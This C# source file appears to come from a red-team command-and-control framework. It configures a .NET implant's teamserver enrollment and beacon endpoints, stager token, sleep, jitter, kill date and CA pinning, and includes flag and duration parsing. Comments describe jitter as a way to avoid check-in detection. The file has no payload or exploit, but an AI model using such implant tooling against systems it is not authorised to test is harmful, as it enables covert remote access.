namespace Rod.Implant.Internal;

// Carries the per-implant profile the reference .NET implant runs with. In the
// full design the profile is embedded into the artifact at generation time
// (architecture.md Sec 5.1) -- sleep, jitter, kill date, and the C2 endpoint
// are baked in so each implant is self-contained. The reference implant takes
// them as flags/env instead, so a single binary runs against any teamserver and
// the build unit can inject them via a generated source file without edits here.

/// <summary>
/// Everything the reference implant needs to enroll and beacon. Mirrors the Go
/// implant's config.Config: <see cref="EnrollURL"/> and <see cref="BeaconURL"/>
/// are the teamserver endpoints, <see cref="StagerToken"/> redeems at enroll,
/// sleep/jitter drive the check-in cadence, and <see cref="KillDate"/> is the
/// hard self-termination timestamp.
/// </summary>
internal sealed class Config
{
    /// <summary>
    /// The http(s) URL of the teamserver enroll endpoint (/implants/enroll). The
    /// implant redeems its stager token here and receives the leaf certificate
    /// plus CA chain bound to (implant_id, engagement_id) (architecture.md Sec 9).
    /// </summary>
    public string EnrollURL { get; set; } = string.Empty;

    /// <summary>
    /// The host:port (or https URL) of the mTLS beacon endpoint (the gRPC
    /// Beacon.CheckIn stream). The implant opens a long-lived reverse connection
    /// here after enrolling (architecture.md Sec 5/8). When empty it is derived
    /// from <see cref="EnrollURL"/>.
    /// </summary>
    public string BeaconURL { get; set; } = string.Empty;

    /// <summary>The one-use secret the operator minted for the engagement.</summary>
    public string StagerToken { get; set; } = string.Empty;

    /// <summary>
    /// The base interval between check-ins. Jitter is applied on top to avoid
    /// periodic-check-in detection (architecture.md Sec 7).
    /// </summary>
    public TimeSpan Sleep { get; set; } = TimeSpan.FromSeconds(30);

    /// <summary>
    /// The random delta added to each Sleep. Half the window either side, so a
    /// 10s jitter on a 30s sleep yields 25s..35s.
    /// </summary>
    public TimeSpan Jitter { get; set; } = TimeSpan.FromSeconds(10);

    /// <summary>
    /// The hard self-termination timestamp (architecture.md Sec 7). Past it the
    /// implant exits and refuses to run. Enforcement is recorded-only in this
    /// milestone; full enforcement arrives with M4.2.
    /// </summary>
    public DateTimeOffset KillDate { get; set; }

    /// <summary>
    /// Optionally, a PEM file pinning the teamserver CA the implant trusts as the
    /// mTLS server identity. When empty the implant trusts the CA chain returned
    /// at enroll (the dev CA shape). Letting enroll supply it keeps the reference
    /// binary CA-agnostic; a real deployment pins it at build time.
    /// </summary>
    public string CACertPath { get; set; } = string.Empty;

    /// <summary>True when a kill date was supplied (env or flag or baked).</summary>
    public bool HasKillDate => KillDate != DateTimeOffset.MinValue;

    /// <summary>
    /// Builds a Config from command-line flags, falling back to the matching ROD_
    /// environment variable for each. Flags win over env. Required fields that are
    /// still empty after both are rejected with a usage error. Mirrors the Go
    /// implant's flag set verbatim so the two implants take the same arguments.
    /// </summary>
    public static Config Parse(string[] args)
    {
        var config = new Config
        {
            EnrollURL = Env("ROD_ENROLL_URL", string.Empty),
            BeaconURL = Env("ROD_BEACON_URL", string.Empty),
            StagerToken = Env("ROD_STAGER_TOKEN", string.Empty),
            Sleep = EnvTimeSpan("ROD_SLEEP", TimeSpan.FromSeconds(30)),
            Jitter = EnvTimeSpan("ROD_JITTER", TimeSpan.FromSeconds(10)),
            CACertPath = Env("ROD_CA_CERT", string.Empty),
        };
        var killDate = Env("ROD_KILL_DATE", string.Empty);
        if (killDate.Length > 0)
            config.KillDate = ParseKillDate(killDate);

        // Hand-rolled parse: no System.CommandLine dependency, matching the
        // "no ceremony" style of the Go flag set. Each flag takes the next arg
        // as its value; -h prints usage and exits with code 2.
        for (var i = 0; i < args.Length; i++)
        {
            var flag = args[i];
            switch (flag)
            {
                case "-h":
                case "--help":
                    Console.Error.WriteLine(Usage);
                    throw new ExitProgramException(2);
                case "-enroll-url":
                case "--enroll-url":
                    config.EnrollURL = TakeValue(args, ref i, flag);
                    break;
                case "-beacon-url":
                case "--beacon-url":
                    config.BeaconURL = TakeValue(args, ref i, flag);
                    break;
                case "-token":
                case "--token":
                    config.StagerToken = TakeValue(args, ref i, flag);
                    break;
                case "-sleep":
                case "--sleep":
                    config.Sleep = ParseGoDuration(TakeValue(args, ref i, flag), TimeSpan.FromSeconds(30));
                    break;
                case "-jitter":
                case "--jitter":
                    config.Jitter = ParseGoDuration(TakeValue(args, ref i, flag), TimeSpan.FromSeconds(10));
                    break;
                case "-kill-date":
                case "--kill-date":
                    config.KillDate = ParseKillDate(TakeValue(args, ref i, flag));
                    break;
                case "-ca-cert":
                case "--ca-cert":
                    config.CACertPath = TakeValue(args, ref i, flag);
                    break;
                default:
                    throw new ExitProgramException(2, $"unknown flag: {flag}\n{Usage}");
            }
        }

        config.Validate();
        return config;
    }

    /// <summary>Enforces the required fields. BeaconURL may be empty when the
    /// enroll/beacon hosts coincide; the beacon client derives it then.</summary>
    private void Validate()
    {
        var missing = new List<string>();
        if (EnrollURL.Length == 0)
            missing.Add("-enroll-url/ROD_ENROLL_URL");
        if (StagerToken.Length == 0)
            missing.Add("-token/ROD_STAGER_TOKEN");
        if (missing.Count > 0)
            throw new ExitProgramException(2, $"missing required config: {string.Join(", ", missing)}\n{Usage}");
    }

    private const string Usage = """
        usage: rod-implant [flags]

          -enroll-url string   teamserver enroll endpoint (https://host:port/implants/enroll)
          -beacon-url string   teamserver mTLS beacon endpoint (host:port or https URL)
          -token string        stager token secret redeeming at enroll
          -sleep duration      beacon sleep interval (default 30s)
          -jitter duration     beacon jitter interval (default 10s)
          -kill-date string    RFC3339 kill date past which the implant exits
          -ca-cert string      optional PEM file pinning the teamserver CA to trust

        Each flag falls back to the matching ROD_* environment variable.
        """;

    private static string Env(string key, string fallback)
        => Environment.GetEnvironmentVariable(key) is { Length: > 0 } v ? v : fallback;

    private static TimeSpan EnvTimeSpan(string key, TimeSpan fallback)
    {
        var raw = Environment.GetEnvironmentVariable(key);
        return raw is { Length: > 0 } ? ParseGoDuration(raw, fallback) : fallback;
    }

    // Returns the value for the flag at index i, advancing i past it. Throws a
    // usage error when the flag has no following value.
    private static string TakeValue(string[] args, ref int i, string flag)
    {
        if (i + 1 >= args.Length)
            throw new ExitProgramException(2, $"flag needs an argument: {flag}\n{Usage}");
        i++;
        return args[i];
    }

    // Parses a Go-style duration ("30s", "1m", "500ms"). The baked profile and
    // the env values come from the Go-shaped build contract, so the implant
    // accepts the same syntax the Go implant's time.ParseDuration produces.
    // Falls back to the supplied default on any parse failure.
    private static TimeSpan ParseGoDuration(string text, TimeSpan fallback)
    {
        if (string.IsNullOrWhiteSpace(text))
            return fallback;
        var span = text.AsSpan().Trim();
        var total = TimeSpan.Zero;
        var pos = 0;
        while (pos < span.Length)
        {
            // Leading sign is allowed once, at the start.
            var neg = false;
            if (span[pos] == '-' || span[pos] == '+')
            {
                neg = span[pos] == '-';
                pos++;
            }

            // Read the integer part.
            var intStart = pos;
            while (pos < span.Length && char.IsDigit(span[pos]))
                pos++;
            if (pos == intStart)
                return fallback;

            // Optional fractional part.
            double value;
            if (pos < span.Length && span[pos] == '.')
            {
                pos++;
                var fracStart = pos;
                while (pos < span.Length && char.IsDigit(span[pos]))
                    pos++;
                if (pos == fracStart)
                    return fallback;
                if (!double.TryParse(
                        span[intStart..pos].ToString(),
                        System.Globalization.NumberStyles.Float,
                        System.Globalization.CultureInfo.InvariantCulture,
                        out value))
                    return fallback;
            }
            else
            {
                if (!long.TryParse(span[intStart..pos], out var intValue))
                    return fallback;
                value = intValue;
            }

            // Unit suffix.
            var unitStart = pos;
            while (pos < span.Length && !char.IsDigit(span[pos]) && span[pos] != '.')
                pos++;
            if (pos == unitStart)
                return fallback;
            var unit = span[unitStart..pos].ToString();
            // Ticks per whole unit. TimeSpan resolution is 100ns (1 tick), so the
            // fractional parts below 100ns round -- fine for beacon intervals,
            // which are always whole seconds. "ns" is intentionally unsupported:
            // a beacon cadence in nanoseconds is nonsensical.
            const long ticksPerMicrosecond = 10;
            const long ticksPerMillisecond = ticksPerMicrosecond * 1000;
            const long ticksPerSecond = ticksPerMillisecond * 1000;
            const long ticksPerMinute = ticksPerSecond * 60;
            const long ticksPerHour = ticksPerMinute * 60;
            long? scaleTicks = unit switch
            {
                "us" or "µs" or "\u03bcs" => ticksPerMicrosecond,
                "ms" => ticksPerMillisecond,
                "s" => ticksPerSecond,
                "m" => ticksPerMinute,
                "h" => ticksPerHour,
                _ => null,
            };
            if (scaleTicks is null)
                return fallback;
            total += TimeSpan.FromTicks((long)(value * scaleTicks.Value));
            if (neg)
                total = -total;
        }
        return total;
    }

    private static DateTimeOffset ParseKillDate(string text)
    {
        // Accept RFC 3339 (the Go time.RFC3339 shape the bake emits) and the
        // round-trip "O" format; both parse with DateTimeOffset.Parse.
        if (!DateTimeOffset.TryParse(text, System.Globalization.CultureInfo.InvariantCulture,
                System.Globalization.DateTimeStyles.AssumeUniversal, out var date))
            throw new ExitProgramException(2, $"kill-date: cannot parse '{text}' as RFC3339");
        return date;
    }
}

/// <summary>
/// Thrown to request a clean exit with a specific code and message (usage error
/// or -h). The program's top level catches it, prints the message, and exits.
/// Mirrors the Go implant's os.Exit(2) on a flag-parse error.
/// </summary>
internal sealed class ExitProgramException : Exception
{
    public int ExitCode { get; }

    // Tracks whether the caller supplied an explicit message. The base Message
    // property returns the type name when none was set, which the caller would
    // then print as noise; HasMessage lets "-h already printed usage" paths pass
    // null and stay quiet.
    public bool HasMessage { get; }
    public override string Message => HasMessage ? base.Message : string.Empty;

    public ExitProgramException(int exitCode, string? message = null)
        : base(message)
    {
        ExitCode = exitCode;
        HasMessage = message is not null;
    }
}
